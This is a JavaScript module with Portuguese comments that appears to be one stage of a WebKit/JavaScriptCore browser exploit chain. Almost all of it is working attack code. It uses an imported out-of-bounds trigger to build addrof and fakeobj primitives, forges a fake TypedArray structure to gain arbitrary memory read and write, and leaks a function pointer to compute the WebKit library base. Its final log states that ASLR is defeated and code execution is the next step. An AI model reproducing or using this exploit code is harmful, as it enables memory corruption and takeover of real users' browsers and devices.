// js/script3/testArrayBufferVictimCrash.mjs (v17 - Final Custom R/W Primitive & Leak)
// =======================================================================================
// ESTRATÉGIA FINAL:
// 1. Reintegrada a primitiva de L/E customizada baseada em TypedArray.
// 2. CORREÇÃO FINAL: Corrigido o erro de lógica (TypeError) que impedia a construção
//    correta da primitiva, ajustando a ordem da limpeza de referências.
// 3. O objetivo é usar esta primitiva final e estável para vazar a base do WebKit.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import { 
    triggerOOB_primitive
} from '../core_exploit.mjs'; // Apenas o gatilho OOB inicial é necessário
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_Leak_Final_v17";

// --- Funções de Conversão ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Ataque Final com Primitiva Customizada ---`, "test");

    let final_result = { success: false, message: "Teste não concluído." };

    try {
        await PAUSE_S3(1000);

        // --- FASE 1: OBTENDO PRIMITIVAS DE CONTROLE INICIAL ---
        logS3("--- FASE 1: Obtendo Primitivas Iniciais (OOB, addrof, fakeobj) ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- FASE 2: CONSTRUINDO NOSSA PRIMITIVA DE L/E CUSTOMIZADA ---
        logS3("--- FASE 2: Construindo Ferramenta de L/E Robusta (Customizada) ---", "subtest");

        const master_arr_victim = new Uint32Array([0x41414141, 0x42424242]);
        const fake_arr_struct = {
            JSCell_Header: new AdvancedInt64(0x0, 0x01082309),
            Butterfly_Ptr: new AdvancedInt64(0x0, 0x0),
            Vector_Ptr: new AdvancedInt64(0x42424242, 0x42424242),
            Length_And_Mode: new AdvancedInt64(0x10000, 0x0)
        };

        const master_arr_victim_addr = addrof(victim_array[0] = master_arr_victim);
        const master_arr_victim_jscell = fakeobj(master_arr_victim_addr);
        
        fake_arr_struct.JSCell_Header = master_arr_victim_jscell[0];
        fake_arr_struct.Butterfly_Ptr = master_arr_victim_jscell[1];
        
        // <-- CORREÇÃO: A ordem da limpeza foi corrigida para evitar o TypeError -->
        const fake_arr_struct_addr = addrof(victim_array[0] = fake_arr_struct);
        const master_arr_controller = fakeobj(fake_arr_struct_addr); // Cria o controller PRIMEIRO...
        victim_array[0] = null; // ...e limpa a referência DEPOIS.
        
        const set_master_arr_addr = (addr_to_point_to) => {
            // Acessa a propriedade 'Vector_Ptr' da nossa estrutura falsa através do controller
            // Acessar por índice [2] é uma forma de acessar o terceiro campo de 64 bits da estrutura.
            master_arr_controller[2] = addr_to_point_to;
        };

        const arb_read64 = (addr) => {
            set_master_arr_addr(addr);
            return new AdvancedInt64(master_arr_victim[0], master_arr_victim[1]);
        };

        const arb_write64 = (addr, value) => {
            set_master_arr_addr(addr);
            master_arr_victim[0] = value.low();
            master_arr_victim[1] = value.high();
        };
        logS3("Primitivas de L/E customizadas via TypedArray estão prontas.", "good");

        // --- FASE 3: VERIFICANDO A PRIMITIVA CUSTOMIZADA ---
        logS3("--- FASE 3: Verificando a Primitiva de L/E Customizada ---", "subtest");
        const test_array = [new AdvancedInt64(0x11223344, 0x55667788)];
        const test_array_addr = addrof(victim_array[0] = test_array);
        victim_array[0] = null;

        const butterfly_addr = arb_read64(test_array_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
        const value_read = arb_read64(butterfly_addr);
        
        if (value_read.equals(test_array[0])) {
            logS3("+++++++++++ SUCESSO! Primitiva de L/E customizada é 100% funcional. ++++++++++++", "vuln");
        } else {
            throw new Error(`Verificação de L/E customizada falhou. Lido: ${value_read.toString(true)}, Esperado: ${test_array[0].toString(true)}`);
        }

        // --- FASE 4: EXECUTANDO O VAZAMENTO DA BASE DO WEBKIT ---
        logS3("--- FASE 4: Executando a Estratégia de Vazamento da Base do WebKit ---", "subtest");
        const leak_obj = { leak_prop: 1 };
        
        logS3(`1. Criado objeto alvo para o vazamento.`, "info");
        const leak_obj_addr = addrof(victim_array[0] = leak_obj);
        victim_array[0] = null;
        logS3(`   - Endereço do objeto alvo: ${leak_obj_addr.toString(true)}`, "leak");

        const structure_addr = arb_read64(leak_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
        logS3(`2. Lendo ponteiro da Estrutura (Structure) do objeto...`, "info");
        logS3(`   - Endereço da Estrutura: ${structure_addr.toString(true)}`, "leak");

        if (structure_addr.low() === 0 && structure_addr.high() === 0) {
            throw new Error("Endereço da Estrutura é nulo. Não é possível continuar.");
        }
        
        const VIRTUAL_PUT_OFFSET = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET;
        const js_object_put_func_ptr_addr = structure_addr.add(VIRTUAL_PUT_OFFSET);
        logS3(`3. Calculando endereço do ponteiro para 'JSC::JSObject::put' na vtable...`, "info");
        logS3(`   - Endereço do ponteiro na vtable: ${js_object_put_func_ptr_addr.toString(true)}`, "leak");

        const js_object_put_func_addr = arb_read64(js_object_put_func_ptr_addr);
        logS3(`4. Lendo o endereço da função 'JSC::JSObject::put'...`, "info");
        logS3(`   - ENDEREÇO VAZADO DA FUNÇÃO: ${js_object_put_func_addr.toString(true)}`, "vuln");

        if (js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) {
            throw new Error("Endereço vazado da função 'put' é nulo. A estratégia falhou.");
        }

        const put_func_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
        const put_func_offset = new AdvancedInt64(parseInt(put_func_offset_str, 16));
        logS3(`5. Calculando o endereço base da biblioteca WebKit...`, "info");
        logS3(`   - Offset de 'JSC::JSObject::put': 0x${put_func_offset_str}`, "info");

        const webkit_base_addr = js_object_put_func_addr.sub(put_func_offset);
        logS3("============================================================================", "good");
        logS3(`||  ENDEREÇO BASE DO WEBKIT CALCULADO: ${webkit_base_addr.toString(true)}  ||`, "good");
        logS3("============================================================================", "good");

        // --- FASE 5: CONCLUSÃO E PRÓXIMOS PASSOS ---
        logS3("--- FASE 5: Conclusão ---", "subtest");
        logS3("O ASLR foi derrotado. Com o endereço base da biblioteca e a primitiva de L/E, o próximo passo é a execução de código.", "vuln");

        final_result.success = true;
        final_result.message = `Vazamento bem-sucedido! Base do WebKit: ${webkit_base_addr.toString(true)}`;
        
    } catch (e) {
        final_result.message = `Exceção na implementação final: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
